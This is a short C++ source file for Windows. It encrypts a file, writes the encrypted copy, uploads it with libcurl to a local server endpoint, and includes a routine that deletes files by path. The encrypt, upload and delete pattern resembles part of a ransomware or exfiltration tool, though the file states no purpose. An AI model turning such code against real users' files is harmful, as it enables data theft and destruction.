#include <curl/curl.h>
#include <Windows.h>
#include <string>
#include <iostream>
#include <codecvt>
#include "Encrypter.h"
#include <vector>

long getFileSize(FILE* file) {
	fseek(file, 0, SEEK_END);
	long size = ftell(file);
	fseek(file, 0, SEEK_SET);
	return size;
}

bool uploadFile(const std::wstring& filePath)
{
    std::vector<unsigned char> ciphertext, tag, nonce;
    if (!encryptFile(filePath, ciphertext, tag, nonce)) {
        std::cerr << "File encryption failed." << std::endl;
        return false;
    }

    CURL* curl;
    CURLcode res;
    struct curl_httppost* form = nullptr;
    struct curl_httppost* lastptr = nullptr;

    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    std::string filePathStr = converter.to_bytes(filePath);

    std::string originalFileName = filePathStr.substr(filePathStr.find_last_of("/\\") + 1);

    curl = curl_easy_init();
    if (curl) {
        std::string url = "http://127.0.0.1:8080/upload";

        // Save the nonce, ciphertext, and tag to the encrypted file
        std::ofstream encryptedFile(originalFileName, std::ios::binary);
        encryptedFile.write(reinterpret_cast<char*>(nonce.data()), nonce.size());           // Write nonce (12 bytes)
        encryptedFile.write(reinterpret_cast<char*>(ciphertext.data()), ciphertext.size()); // Write ciphertext
        encryptedFile.write(reinterpret_cast<char*>(tag.data()), tag.size());               // Write GCM tag (16 bytes)
        encryptedFile.close();

        // Prepare the form to upload the file
        curl_formadd(&form, &lastptr,
            CURLFORM_COPYNAME, "file",
            CURLFORM_FILE, originalFileName.c_str(),
            CURLFORM_END);

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());

        curl_easy_setopt(curl, CURLOPT_HTTPPOST, form);

        // Perform the upload
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "Upload failed: " << curl_easy_strerror(res) << std::endl;
            curl_easy_cleanup(curl);
            curl_formfree(form);
            return false;
        }

        // Cleanup
        curl_easy_cleanup(curl);
        curl_formfree(form);
    }

    return true;
}


bool deleteFile(const std::wstring& filePath) {
	if (DeleteFile(filePath.c_str())) {
		std::wcout << L"File Deleted: " << filePath << std::endl;
		return true;
	}
	else {
		std::wcerr << L"Failed to Delete: " << filePath << std::endl;
		return false;
	}
}